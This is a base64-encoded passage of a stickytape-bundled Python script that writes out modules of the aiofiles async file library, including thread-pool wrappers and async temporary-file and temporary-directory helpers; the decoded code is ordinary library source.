NYW5hZ2VyKF9Db250ZXh0TWFuYWdlcik6XG4gICAgIiIiQW4gYWRqdXN0ZWQgYXN5bmMgY29udGV4dCBtYW5hZ2VyIGZvciBhaW9maWxlcy4iIiJcblxuICAgIGFzeW5jIGRlZiBfX2FleGl0X18oc2VsZiwgZXhjX3R5cGUsIGV4Y192YWwsIGV4Y190Yik6XG4gICAgICAgIGF3YWl0IHNlbGYuX29iai5jbG9zZSgpXG4gICAgICAgIHNlbGYuX29iaiA9IE5vbmVcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9maWxlcy90aHJlYWRwb29sL3V0aWxzLnB5JywgYidpbXBvcnQgZnVuY3Rvb2xzXG5mcm9tIHR5cGVzIGltcG9ydCBjb3JvdXRpbmVcblxuXG5kZWYgZGVsZWdhdGVfdG9fZXhlY3V0b3IoKmF0dHJzKTpcbiAgICBkZWYgY2xzX2J1aWxkZXIoY2xzKTpcbiAgICAgICAgZm9yIGF0dHJfbmFtZSBpbiBhdHRyczpcbiAgICAgICAgICAgIHNldGF0dHIoY2xzLCBhdHRyX25hbWUsIF9tYWtlX2RlbGVnYXRlX21ldGhvZChhdHRyX25hbWUpKVxuICAgICAgICByZXR1cm4gY2xzXG5cbiAgICByZXR1cm4gY2xzX2J1aWxkZXJcblxuXG5kZWYgcHJveHlfbWV0aG9kX2RpcmVjdGx5KCphdHRycyk6XG4gICAgZGVmIGNsc19idWlsZGVyKGNscyk6XG4gICAgICAgIGZvciBhdHRyX25hbWUgaW4gYXR0cnM6XG4gICAgICAgICAgICBzZXRhdHRyKGNscywgYXR0cl9uYW1lLCBfbWFrZV9wcm94eV9tZXRob2QoYXR0cl9uYW1lKSlcbiAgICAgICAgcmV0dXJuIGNsc1xuXG4gICAgcmV0dXJuIGNsc19idWlsZGVyXG5cblxuZGVmIHByb3h5X3Byb3BlcnR5X2RpcmVjdGx5KCphdHRycyk6XG4gICAgZGVmIGNsc19idWlsZGVyKGNscyk6XG4gICAgICAgIGZvciBhdHRyX25hbWUgaW4gYXR0cnM6XG4gICAgICAgICAgICBzZXRhdHRyKGNscywgYXR0cl9uYW1lLCBfbWFrZV9wcm94eV9wcm9wZXJ0eShhdHRyX25hbWUpKVxuICAgICAgICByZXR1cm4gY2xzXG5cbiAgICByZXR1cm4gY2xzX2J1aWxkZXJcblxuXG5kZWYgY29uZF9kZWxlZ2F0ZV90b19leGVjdXRvcigqYXR0cnMpOlxuICAgIGRlZiBjbHNfYnVpbGRlcihjbHMpOlxuICAgICAgICBmb3IgYXR0cl9uYW1lIGluIGF0dHJzOlxuICAgICAgICAgICAgc2V0YXR0cihjbHMsIGF0dHJfbmFtZSwgX21ha2VfY29uZF9kZWxlZ2F0ZV9tZXRob2QoYXR0cl9uYW1lKSlcbiAgICAgICAgcmV0dXJuIGNsc1xuXG4gICAgcmV0dXJuIGNsc19idWlsZGVyXG5cblxuZGVmIF9tYWtlX2RlbGVnYXRlX21ldGhvZChhdHRyX25hbWUpOlxuICAgIEBjb3JvdXRpbmVcbiAgICBkZWYgbWV0aG9kKHNlbGYsICphcmdzLCAqKmt3YXJncyk6XG4gICAgICAgIGNiID0gZnVuY3Rvb2xzLnBhcnRpYWwoZ2V0YXR0cihzZWxmLl9maWxlLCBhdHRyX25hbWUpLCAqYXJncywgKiprd2FyZ3MpXG4gICAgICAgIHJldHVybiAoeWllbGQgZnJvbSBzZWxmLl9sb29wLnJ1bl9pbl9leGVjdXRvcihzZWxmLl9leGVjdXRvciwgY2IpKVxuXG4gICAgcmV0dXJuIG1ldGhvZFxuXG5cbmRlZiBfbWFrZV9wcm94eV9tZXRob2QoYXR0cl9uYW1lKTpcbiAgICBkZWYgbWV0aG9kKHNlbGYsICphcmdzLCAqKmt3YXJncyk6XG4gICAgICAgIHJldHVybiBnZXRhdHRyKHNlbGYuX2ZpbGUsIGF0dHJfbmFtZSkoKmFyZ3MsICoqa3dhcmdzKVxuXG4gICAgcmV0dXJuIG1ldGhvZFxuXG5cbmRlZiBfbWFrZV9wcm94eV9wcm9wZXJ0eShhdHRyX25hbWUpOlxuICAgIGRlZiBwcm94eV9wcm9wZXJ0eShzZWxmKTpcbiAgICAgICAgcmV0dXJuIGdldGF0dHIoc2VsZi5fZmlsZSwgYXR0cl9uYW1lKVxuXG4gICAgcmV0dXJuIHByb3BlcnR5KHByb3h5X3Byb3BlcnR5KVxuXG5cbmRlZiBfbWFrZV9jb25kX2RlbGVnYXRlX21ldGhvZChhdHRyX25hbWUpOlxuICAgICIiIkZvciBzcG9vbGVkIHRlbXAgZmlsZXMsIGRlbGVnYXRlIG9ubHkgaWYgcm9sbGVkIHRvIGZpbGUgb2JqZWN0IiIiXG5cbiAgICBhc3luYyBkZWYgbWV0aG9kKHNlbGYsICphcmdzLCAqKmt3YXJncyk6XG4gICAgICAgIGlmIHNlbGYuX2ZpbGUuX3JvbGxlZDpcbiAgICAgICAgICAgIGNiID0gZnVuY3Rvb2xzLnBhcnRpYWwoZ2V0YXR0cihzZWxmLl9maWxlLCBhdHRyX25hbWUpLCAqYXJncywgKiprd2FyZ3MpXG4gICAgICAgICAgICByZXR1cm4gYXdhaXQgc2VsZi5fbG9vcC5ydW5faW5fZXhlY3V0b3Ioc2VsZi5fZXhlY3V0b3IsIGNiKVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgcmV0dXJuIGdldGF0dHIoc2VsZi5fZmlsZSwgYXR0cl9uYW1lKSgqYXJncywgKiprd2FyZ3MpXG5cbiAgICByZXR1cm4gbWV0aG9kXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvZmlsZXMvdGhyZWFkcG9vbC90ZXh0LnB5JywgYidmcm9tIC4uYmFzZSBpbXBvcnQgQXN5bmNCYXNlXG5mcm9tIC51dGlscyBpbXBvcnQgKFxuICAgIGRlbGVnYXRlX3RvX2V4ZWN1dG9yLFxuICAgIHByb3h5X21ldGhvZF9kaXJlY3RseSxcbiAgICBwcm94eV9wcm9wZXJ0eV9kaXJlY3RseSxcbilcblxuXG5AZGVsZWdhdGVfdG9fZXhlY3V0b3IoXG4gICAgImNsb3NlIixcbiAgICAiZmx1c2giLFxuICAgICJpc2F0dHkiLFxuICAgICJyZWFkIixcbiAgICAicmVhZGFibGUiLFxuICAgICJyZWFkbGluZSIsXG4gICAgInJlYWRsaW5lcyIsXG4gICAgInNlZWsiLFxuICAgICJzZWVrYWJsZSIsXG4gICAgInRlbGwiLFxuICAgICJ0cnVuY2F0ZSIsXG4gICAgIndyaXRlIixcbiAgICAid3JpdGFibGUiLFxuICAgICJ3cml0ZWxpbmVzIixcbilcbkBwcm94eV9tZXRob2RfZGlyZWN0bHkoImRldGFjaCIsICJmaWxlbm8iLCAicmVhZGFibGUiKVxuQHByb3h5X3Byb3BlcnR5X2RpcmVjdGx5KFxuICAgICJidWZmZXIiLFxuICAgICJjbG9zZWQiLFxuICAgICJlbmNvZGluZyIsXG4gICAgImVycm9ycyIsXG4gICAgImxpbmVfYnVmZmVyaW5nIixcbiAgICAibmV3bGluZXMiLFxuICAgICJuYW1lIixcbiAgICAibW9kZSIsXG4pXG5jbGFzcyBBc3luY1RleHRJT1dyYXBwZXIoQXN5bmNCYXNlKTpcbiAgICAiIiJUaGUgYXN5bmNpbyBleGVjdXRvciB2ZXJzaW9uIG9mIGlvLlRleHRJT1dyYXBwZXIuIiIiXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvZmlsZXMvdGVtcGZpbGUvX19pbml0X18ucHknLCBiJyMgSW1wb3J0c1xyXG5pbXBvcnQgYXN5bmNpb1xyXG5mcm9tIHRlbXBmaWxlIGltcG9ydCAoXHJcbiAgICBUZW1wb3JhcnlGaWxlIGFzIHN5bmNUZW1wb3JhcnlGaWxlLFxyXG4gICAgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIHN5bmNOYW1lZFRlbXBvcmFyeUZpbGUsXHJcbiAgICBTcG9vbGVkVGVtcG9yYXJ5RmlsZSBhcyBzeW5jU3Bvb2xlZFRlbXBvcmFyeUZpbGUsXHJcbiAgICBUZW1wb3JhcnlEaXJlY3RvcnkgYXMgc3luY1RlbXBvcmFyeURpcmVjdG9yeSxcclxuICAgIF9UZW1wb3JhcnlGaWxlV3JhcHBlciBhcyBzeW5jVGVtcG9yYXJ5RmlsZVdyYXBwZXIsXHJcbilcclxuZnJvbSBpbyBpbXBvcnQgRmlsZUlPLCBUZXh0SU9CYXNlLCBCdWZmZXJlZFJlYWRlciwgQnVmZmVyZWRXcml0ZXIsIEJ1ZmZlcmVkUmFuZG9tXHJcbmZyb20gZnVuY3Rvb2xzIGltcG9ydCBwYXJ0aWFsLCBzaW5nbGVkaXNwYXRjaFxyXG5mcm9tIC4uYmFzZSBpbXBvcnQgQWlvZmlsZXNDb250ZXh0TWFuYWdlclxyXG5mcm9tIC4udGhyZWFkcG9vbC50ZXh0IGltcG9ydCBBc3luY1RleHRJT1dyYXBwZXJcclxuZnJvbSAuLnRocmVhZHBvb2wuYmluYXJ5IGltcG9ydCBBc3luY0J1ZmZlcmVkSU9CYXNlLCBBc3luY0J1ZmZlcmVkUmVhZGVyLCBBc3luY0ZpbGVJT1xyXG5mcm9tIC50ZW1wdHlwZXMgaW1wb3J0IEFzeW5jU3Bvb2xlZFRlbXBvcmFyeUZpbGUsIEFzeW5jVGVtcG9yYXJ5RGlyZWN0b3J5XHJcblxyXG5fX2FsbF9fID0gW1xyXG4gICAgIk5hbWVkVGVtcG9yYXJ5RmlsZSIsXHJcbiAgICAiVGVtcG9yYXJ5RmlsZSIsXHJcbiAgICAiU3Bvb2xlZFRlbXBvcmFyeUZpbGUiLFxyXG4gICAgIlRlbXBvcmFyeURpcmVjdG9yeSIsXHJcbl1cclxuXHJcblxyXG4jID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cclxuIyBQdWJsaWMgbWV0aG9kcyBmb3IgYXN5bmMgb3BlbiBhbmQgcmV0dXJuIG9mIHRlbXAgZmlsZS9kaXJlY3RvcnlcclxuIyBvYmplY3RzIHdpdGggYXN5bmMgaW50ZXJmYWNlXHJcbiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxyXG5kZWYgTmFtZWRUZW1wb3JhcnlGaWxlKFxyXG4gICAgbW9kZT0idytiIixcclxuICAgIGJ1ZmZlcmluZz0tMSxcclxuICAgIGVuY29kaW5nPU5vbmUsXHJcbiAgICBuZXdsaW5lPU5vbmUsXHJcbiAgICBzdWZmaXg9Tm9uZSxcclxuICAgIHByZWZpeD1Ob25lLFxyXG4gICAgZGlyPU5vbmUsXHJcbiAgICBkZWxldGU9VHJ1ZSxcclxuICAgIGxvb3A9Tm9uZSxcclxuICAgIGV4ZWN1dG9yPU5vbmUsXHJcbik6XHJcbiAgICAiIiJBc3luYyBvcGVuIGEgbmFtZWQgdGVtcG9yYXJ5IGZpbGUiIiJcclxuICAgIHJldHVybiBBaW9maWxlc0NvbnRleHRNYW5hZ2VyKFxyXG4gICAgICAgIF90ZW1wb3JhcnlfZmlsZShcclxuICAgICAgICAgICAgbmFtZWQ9VHJ1ZSxcclxuICAgICAgICAgICAgbW9kZT1tb2RlLFxyXG4gICAgICAgICAgICBidWZmZXJpbmc9YnVmZmVyaW5nLFxyXG4gICAgICAgICAgICBlbmNvZGluZz1lbmNvZGluZyxcclxuICAgICAgICAgICAgbmV3bGluZT1uZXdsaW5lLFxyXG4gICAgICAgICAgICBzdWZmaXg9c3VmZml4LFxyXG4gICAgICAgICAgICBwcmVmaXg9cHJlZml4LFxyXG4gICAgICAgICAgICBkaXI9ZGlyLFxyXG4gICAgICAgICAgICBkZWxldGU9ZGVsZXRlLFxyXG4gICAgICAgICAgICBsb29wPWxvb3AsXHJcbiAgICAgICAgICAgIGV4ZWN1dG9yPWV4ZWN1dG9yLFxyXG4gICAgICAgIClcclxuICAgIClcclxuXHJcblxyXG5kZWYgVGVtcG9yYXJ5RmlsZShcclxuICAgIG1vZGU9IncrYiIsXHJcbiAgICBidWZmZXJpbmc9LTEsXHJcbiAgICBlbmNvZGluZz1Ob25lLFxyXG4gICAgbmV3bGluZT1Ob25lLFxyXG4gICAgc3VmZml4PU5vbmUsXHJcbiAgICBwcmVmaXg9Tm9uZSxcclxuICAgIGRpcj1Ob25lLFxyXG4gICAgbG9vcD1Ob25lLFxyXG4gICAgZXhlY3V0b3I9Tm9uZSxcclxuKTpcclxuICAgICIiIkFzeW5jIG9wZW4gYW4gdW5uYW1lZCB0ZW1wb3JhcnkgZmlsZSIiIlxyXG4gICAgcmV0dXJuIEFpb2ZpbGVzQ29udGV4dE1hbmFnZXIoXHJcbiAgICAgICAgX3RlbXBvcmFyeV9maWxlKFxyXG4gICAgICAgICAgICBuYW1lZD1GYWxzZSxcclxuICAgICAgICAgICAgbW9kZT1tb2RlLFxyXG4gICAgICAgICAgICBidWZmZXJpbmc9YnVmZmVyaW5nLFxyXG4gICAgICAgICAgICBlbmNvZGluZz1lbmNvZGluZyxcclxuICAgICAgICAgICAgbmV3bGluZT1uZXdsaW5lLFxyXG4gICAgICAgICAgICBzdWZmaXg9c3VmZml4LFxyXG4gICAgICAgICAgICBwcmVmaXg9cHJlZml4LFxyXG4gICAgICAgICAgICBkaXI9ZGlyLFxyXG4gICAgICAgICAgICBsb29wPWxvb3AsXHJcbiAgICAgICAgICAgIGV4ZWN1dG9yPWV4ZWN1dG9yLFxyXG4gICAgICAgIClcclxuICAgIClcclxuXHJcblxyXG5kZWYgU3Bvb2xlZFRlbXBvcmFyeUZpbGUoXHJcbiAgICBtYXhfc2l6ZT0wLFxyXG4gICAgbW9kZT0idytiIixcclxuICAgIGJ1ZmZlcmluZz0tMSxcclxuICAgIGVuY29kaW5nPU5vbmUsXHJcbiAgICBuZXdsaW5lPU5vbmUsXHJcbiAgICBzdWZmaXg9Tm9uZSxcclxuICAgIHByZWZpeD1Ob25lLFxyXG4gICAgZGlyPU5vbmUsXHJcbiAgICBsb29wPU5vbmUsXHJcbiAgICBleGVjdXRvcj1Ob25lLFxyXG4pOlxyXG4gICAgIiIiQXN5bmMgb3BlbiBhIHNwb29sZWQgdGVtcG9yYXJ5IGZpbGUiIiJcclxuICAgIHJldHVybiBBaW9maWxlc0NvbnRleHRNYW5hZ2VyKFxyXG4gICAgICAgIF9zcG9vbGVkX3RlbXBvcmFyeV9maWxlKFxyXG4gICAgICAgICAgICBtYXhfc2l6ZT1tYXhfc2l6ZSxcclxuICAgICAgICAgICAgbW9kZT1tb2RlLFxyXG4gICAgICAgICAgICBidWZmZXJpbmc9YnVmZmVyaW5nLFxyXG4gICAgICAgICAgICBlbmNvZGluZz1lbmNvZGluZyxcclxuICAgICAgICAgICAgbmV3bGluZT1uZXdsaW5lLFxyXG4gICAgICAgICAgICBzdWZmaXg9c3VmZml4LFxyXG4gICAgICAgICAgICBwcmVmaXg9cHJlZml4LFxyXG4gICAgICAgICAgICBkaXI9ZGlyLFxyXG4gICAgICAgICAgICBsb29wPWxvb3AsXHJcbiAgICAgICAgICAgIGV4ZWN1dG9yPWV4ZWN1dG9yLFxyXG4gICAgICAgIClcclxuICAgIClcclxuXHJcblxyXG5kZWYgVGVtcG9yYXJ5RGlyZWN0b3J5KHN1ZmZpeD1Ob25lLCBwcmVmaXg9Tm9uZSwgZGlyPU5vbmUsIGxvb3A9Tm9uZSwgZXhlY3V0b3I9Tm9uZSk6XHJcbiAgICAiIiJBc3luYyBvcGVuIGEgdGVtcG9yYXJ5IGRpcmVjdG9yeSIiIlxyXG4gICAgcmV0dXJuIEFpb2ZpbGVzQ29udGV4dE1hbmFnZXJUZW1wRGlyKFxyXG4gICAgICAgIF90ZW1wb3JhcnlfZGlyZWN0b3J5KFxyXG4gICAgICAgICAgICBzdWZmaXg9c3VmZml4LCBwcmVmaXg9cHJlZml4LCBkaXI9ZGlyLCBsb29wPWxvb3AsIGV4ZWN1dG9yPWV4ZWN1dG9yXHJcbiAgICAgICAgKVxyXG4gICAgKVxyXG5cclxuXHJcbiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XHJcbiMgSW50ZXJuYWwgY29yb3V0aW5lcyB0byBvcGVuIG5ldyB0ZW1wIGZpbGVzL2RpcmVjdG9yaWVzXHJcbiMgPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XHJcbmFzeW5jIGRlZiBfdGVtcG9yYXJ5X2ZpbGUoXHJcbiAgICBuYW1lZD1UcnVlLFxyXG4gICAgbW9kZT0idytiIixcclxuICAgIGJ1ZmZlcmluZz0tMSxcclxuICAgIGVuY29kaW5nPU5vbmUsXHJcbiAgICBuZXdsaW5lPU5vbmUsXHJcbiAgICBzdWZmaXg9Tm9uZSxcclxuICAgIHByZWZpeD1Ob25lLFxyXG4gICAgZGlyPU5vbmUsXHJcbiAgICBkZWxldGU9VHJ1ZSxcclxuICAgIGxvb3A9Tm9uZSxcclxuICAgIGV4ZWN1dG9yPU5vbmUsXHJcbiAgICBtYXhfc2l6ZT0wLFxyXG4pOlxyXG4gICAgIiIiQXN5bmMgbWV0aG9kIHRvIG9wZW4gYSB0ZW1wb3JhcnkgZmlsZSB3aXRoIGFzeW5jIGludGVyZmFjZSIiIlxyXG4gICAgaWYgbG9vcCBpcyBOb25lOlxyXG4gICAgICAgIGxvb3AgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKClcclxuXHJcbiAgICBpZiBuYW1lZDpcclxuICAgICAgICBjYiA9IHBhcnRpYWwoXHJcbiAgICAgICAgICAgIHN5bmNOYW1lZFRlbXBvcmFyeUZpbGUsXHJcbiAgICAgICAgICAgIG1vZGU9bW9kZSxcclxuICAgICAgICAgICAgYnVmZmVyaW5nPWJ1ZmZlcmluZyxcclxuICAgICAgICAgICAgZW5jb2Rpbmc9ZW5jb2RpbmcsXHJcbiAgICAgICAgICAgIG5ld2xpbmU9bmV3bGluZSxcclxuICAgICAgICAgICAgc3VmZml4PXN1ZmZpeCxcclxuICAgICAgICAgICAgcHJlZml4PXByZWZpeCxcclxuICAgICAgICAgICAgZGlyPWRpcixcclxuICAgICAgICAgICAgZGVsZXRlPWRlbGV0ZSxcclxuICAgICAgICApXHJcbiAgICBlbHNlOlxyXG4gICAgICAgIGNiID0gcGFydGlhbChcclxuICAgICAgICAgICAgc3luY1RlbXBvcmFyeUZpbGUsXHJcbiAgICAgICAgICAgIG1vZGU9bW9kZSxcclxuICAgICAgICAgICAgYnVmZmVyaW5nPWJ1ZmZlcmluZyxcclxuICAgICAgICAgICAgZW5jb2Rpbmc9ZW5jb2RpbmcsXHJcbiAgICAgICAgICAgIG5ld2xpbmU9bmV3bGluZSxcclxuICAgICAgICAgICAgc3VmZml4PXN1ZmZpeCxcclxuICAgICAgICAgICAgcHJlZml4PXByZWZpeCxcclxuICAgICAgICAgICAgZGlyPWRpcixcclxuICAgICAgICApXHJcblxyXG4gICAgZiA9IGF3YWl0IGxvb3AucnVuX2luX2V4ZWN1dG9yKGV4ZWN1dG9yLCBjYilcclxuXHJcbiAgICAjIFdyYXAgYmFzZWQgb24gdHlwZSBvZiB1bmRlcmx5aW5nIElPIG9iamVjdFxyXG4gICAgaWYgdHlwZShmKSBpcyBzeW5jVGVtcG9yYXJ5RmlsZVdyYXBwZXI6XHJcbiAgICAgICAgIyBfVGVtcG9yYXJ5RmlsZVdyYXBwZXIgd2FzIHVzZWQgKG5hbWVkIGZpbGVzKVxyXG4gICAgICAgIHJlc3VsdCA9IHdyYXAoZi5maWxlLCBmLCBsb29wPWxvb3AsIGV4ZWN1dG9yPWV4ZWN1dG9yKVxyXG4gICAgICAgICMgYWRkIGRlbGV0ZSBwcm9wZXJ0eVxyXG4gICAgICAgIHJlc3VsdC5kZWxldGUgPSBmLmRlbGV0ZVxyXG4gICAgICAgIHJldHVybiByZXN1bHRcclxuICAgIGVsc2U6XHJcbiAgICAgICAgIyBJTyBvYmplY3Qgd2FzIHJldHVybmVkIGRpcmVjdGx5IHdpdGhvdXQgd3JhcHBlclxyXG4gICAgICAgIHJldHVybiB3cmFwKGYsIGYsIGxvb3A9bG9vcCwgZXhlY3V0b3I9ZXhlY3V0b3IpXHJcblxyXG5cclxuYXN5bmMgZGVmIF9zcG9vbGVkX3RlbXBvcmFyeV9maWxlKFxyXG4gICAgbWF4X3NpemU9MCxcclxuICAgIG1vZGU9IncrYiIsXHJcbiAgICBidWZmZXJpbmc9LTEsXHJcbiAgICBlbmNvZGluZz1Ob25lLFxyXG4gICAgbmV3bGluZT1Ob25lLFxyXG4gICAgc3VmZml4PU5vbmUsXHJcbiAgICBwcmVmaXg9Tm9uZSxcclxuICAgIGRpcj1Ob25lLFxyXG4gICAgbG9vcD1Ob25lLFxyXG4gICAgZXhlY3V0b3I9Tm9uZSxcclxuKTpcclxuICAgICIiIk9wZW4gYSBzcG9vbGVkIHRlbXBvcmFyeSBmaWxlIHdpdGggYXN5bmMgaW50ZXJmYWNlIiIiXHJcbiAgICBpZiBsb29wIGlzIE5vbmU6XHJcbiAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxyXG5cclxuICAgIGNiID0gcGFydGlhbChcclxuICAgICAgICBzeW5jU3Bvb2xlZFRlbXBvcmFyeUZpbGUsXHJcbiAgICAgICAgbWF4X3NpemU9bWF4X3NpemUsXHJcbiAgICAgICAgbW9kZT1tb2RlLFxyXG4gICAgICAgIGJ1ZmZlcmluZz1idWZmZXJpbmcsXHJcbiAgICAgICAgZW5jb2Rpbmc9ZW5jb2RpbmcsXHJcbiAgICAgICAgbmV3bGluZT1uZXdsaW5lLFxyXG4gICAgICAgIHN1ZmZpeD1zdWZmaXgsXHJcbiAgICAgICAgcHJlZml4PXByZWZpeCxcclxuICAgICAgICBkaXI9ZGlyLFxyXG4gICAgKVxyXG5cclxuICAgIGYgPSBhd2FpdCBsb29wLnJ1bl9pbl9leGVjdXRvcihleGVjdXRvciwgY2IpXHJcblxyXG4gICAgIyBTaW5nbGUgaW50ZXJmYWNlIHByb3ZpZGVkIGJ5IFNwb29sZWRUZW1wb3JhcnlGaWxlIGZvciBhbGwgbW9kZXNcclxuICAgIHJldHVybiBBc3luY1Nwb29sZWRUZW1wb3JhcnlGaWxlKGYsIGxvb3A9bG9vcCwgZXhlY3V0b3I9ZXhlY3V0b3IpXHJcblxyXG5cclxuYXN5bmMgZGVmIF90ZW1wb3JhcnlfZGlyZWN0b3J5KFxyXG4gICAgc3VmZml4PU5vbmUsIHByZWZpeD1Ob25lLCBkaXI9Tm9uZSwgbG9vcD1Ob25lLCBleGVjdXRvcj1Ob25lXHJcbik6XHJcbiAgICAiIiJBc3luYyBtZXRob2QgdG8gb3BlbiBhIHRlbXBvcmFyeSBkaXJlY3Rvcnkgd2l0aCBhc3luYyBpbnRlcmZhY2UiIiJcclxuICAgIGlmIGxvb3AgaXMgTm9uZTpcclxuICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcblxyXG4gICAgY2IgPSBwYXJ0aWFsKHN5bmNUZW1wb3JhcnlEaXJlY3RvcnksIHN1ZmZpeCwgcHJlZml4LCBkaXIpXHJcbiAgICBmID0gYXdhaXQgbG9vcC5ydW5faW5fZXhlY3V0b3IoZXhlY3V0b3IsIGNiKVxyXG5cclxuICAgIHJldHVybiBBc3luY1RlbXBvcmFyeURpcmVjdG9yeShmLCBsb29wPWxvb3AsIGV4ZWN1dG9yPWV4ZWN1dG9yKVxyXG5cclxuXHJcbmNsYXNzIEFpb2ZpbGVzQ29udGV4dE1hbmFnZXJUZW1wRGlyKEFpb2ZpbGVzQ29udGV4dE1hbmFnZXIpOlxyXG4gICAgIiIiV2l0aCByZXR1cm5zIHRoZSBkaXJlY3RvcnkgbG9jYXRpb24sIG5vdCB0aGUgb2JqZWN0IChtYXRjaGluZyBzeW5jIGxpYikiIiJcclxuXHJcbiAgICBhc3luYyBkZWYgX19hZW50ZXJfXyhzZWxmKTpcclxuICAgICAgICBzZWxmLl9vYmogPSBhd2FpdCBzZWxmLl9jb3JvXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX29iai5uYW1lXHJcblxyXG5cclxuQHNpbmdsZWRpc3BhdGNoXHJcbmRlZiB3cmFwKGJhc2VfaW9fb2JqLCBmaWxlLCAqLCBsb29wPU5vbmUsIGV4ZWN1dG9yPU5vbmUpOlxyXG4gICAgIiIiV3JhcCB0aGUgb2JqZWN0IHdpdGggaW50ZXJmYWNlIGJhc2VkIG9uIHR5cGUgb2YgdW5kZXJseWluZyBJTyIiIlxyXG4gICAgcmFpc2UgVHlwZUVycm9yKCJVbnN1cHBvcnRlZCBJTyB0eXBlOiB7fSIuZm9ybWF0KGJhc2VfaW9fb2JqKSlcclxuXHJcblxyXG5Ad3JhcC5yZWdpc3RlcihUZXh0SU9CYXNlKVxyXG5kZWYgXyhiYXNlX2lvX29iaiwgZmlsZSwgKiwgbG9vcD1Ob25lLCBleGVjdXRvcj1Ob25lKTpcclxuICAgIHJldHVybiBBc3luY1RleHRJT1dyYXBwZXIoZmlsZSwgbG9vcD1sb29wLCBleGVjdXRvcj1leGVjdXRvcilcclxuXHJcblxyXG5Ad3JhcC5yZWdpc3RlcihCdWZmZXJlZFdyaXRlcilcclxuZGVmIF8oYmFzZV9pb19vYmosIGZpbGUsICosIGxvb3A9Tm9uZSwgZXhlY3V0b3I9Tm9uZSk6XHJcbiAgICByZXR1cm4gQXN5bmNCdWZmZXJlZElPQmFzZShmaWxlLCBsb29wPWxvb3AsIGV4ZWN1dG9yPWV4ZWN1dG9yKVxyXG5cclxuXHJcbkB3cmFwLnJlZ2lzdGVyKEJ1ZmZlcmVkUmVhZGVyKVxyXG5Ad3JhcC5yZWdpc3RlcihCdWZmZXJlZFJhbmRvbSlcclxuZGVmIF8oYmFzZV9pb19vYmosIGZpbGUsICosIGxvb3A9Tm9uZSwgZXhlY3V0b3I9Tm9uZSk6XHJcbiAgICByZXR1cm4gQXN5bmNCdWZmZXJlZFJlYWRlcihmaWxlLCBsb29wPWxvb3AsIGV4ZWN1dG9yPWV4ZWN1dG9yKVxyXG5cclxuXHJcbkB3cmFwLnJlZ2lzdGVyKEZpbGVJTylcclxuZGVmIF8oYmFzZV9pb19vYmosIGZpbGUsICosIGxvb3A9Tm9uZSwgZXhlY3V0b3I9Tm9uZSk6XHJcbiAgICByZXR1cm4gQXN5bmNGaWxlSU8oZmlsZSwgbG9vcD1sb29wLCBleGVjdXRvcj1leGVjdXRvcilcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2ZpbGVzL3RlbXBmaWxlL3RlbXB0eXBlcy5weScsIGInIiIiQXN5bmMgd3JhcHBlcnMgZm9yIHNwb29sZWQgdGVtcCBmaWxlcyBhbmQgdGVtcCBkaXJlY3Rvcnkgb2JqZWN0cyIiIlxyXG5cclxuIyBJbXBvcnRzXHJcbmltcG9ydCBhc3luY2lvXHJcbmZyb20gdHlwZXMgaW1wb3J0IGNvcm91dGluZVxyXG5cclxuZnJvbSAuLmJhc2UgaW1wb3J0IEFzeW5jQmFzZVxyXG5mcm9tIC4udGhyZWFkcG9vbC51dGlscyBpbXBvcnQgKFxyXG4gICAgZGVsZWdhdGVfdG9fZXhlY3V0b3IsXHJcbiAgICBwcm94eV9wcm9wZXJ0eV9kaXJlY3RseSxcclxuICAgIGNvbmRfZGVsZWdhdGVfdG9fZXhlY3V0b3IsXHJcbilcclxuZnJvbSBmdW5jdG9vbHMgaW1wb3J0IHBhcnRpYWxcclxuXHJcblxyXG5AZGVsZWdhdGVfdG9fZXhlY3V0b3IoImZpbGVubyIsICJyb2xsb3ZlciIpXHJcbkBjb25kX2RlbGVnYXRlX3RvX2V4ZWN1dG9yKFxyXG4gICAgImNsb3NlIixcclxuICAgICJmbHVzaCIsXHJcbiAgICAiaXNhdHR5IixcclxuICAgICJuZXdsaW5lcyIsXHJcbiAgICAicmVhZCIsXHJcbiAgICAicmVhZGxpbmUiLFxyXG4gICAgInJlYWRsaW5lcyIsXHJcbiAgICAic2VlayIsXHJcbiAgICAidGVsbCIsXHJcbiAgICAidHJ1bmNhdGUiLFxyXG4pXHJcbkBwcm94eV9wcm9wZXJ0eV9kaXJlY3RseSgiY2xvc2VkIiwgImVuY29kaW5nIiwgIm1vZGUiLCAibmFtZSIsICJzb2Z0c3BhY2UiKVxyXG5jbGFzcyBBc3luY1Nwb29sZWRUZW1wb3JhcnlGaWxlKEFzeW5jQmFzZSk6XHJcbiAgICAiIiJBc3luYyB3cmFwcGVyIGZvciBTcG9vbGVkVGVtcG9yYXJ5RmlsZSBjbGFzcyIiIlxyXG5cclxuICAgIGFzeW5jIGRlZiBfY2hlY2soc2VsZik6XHJcbiAgICAgICAgaWYgc2VsZi5fZmlsZS5fcm9sbGVkOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBtYXhfc2l6ZSA9IHNlbGYuX2ZpbGUuX21heF9zaXplXHJcbiAgICAgICAgaWYgbWF4X3NpemUgYW5kIHNlbGYuX2ZpbGUudGVsbCgpID4gbWF4X3NpemU6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYucm9sbG92ZXIoKVxyXG5cclxuICAgIGFzeW5jIGRlZiB3cml0ZShzZWxmLCBzKTpcclxuICAgICAgICAiIiJJbXBsZW1lbnRhdGlvbiB0byBhbnRpY2lwYXRlIHJvbGxvdmVyIiI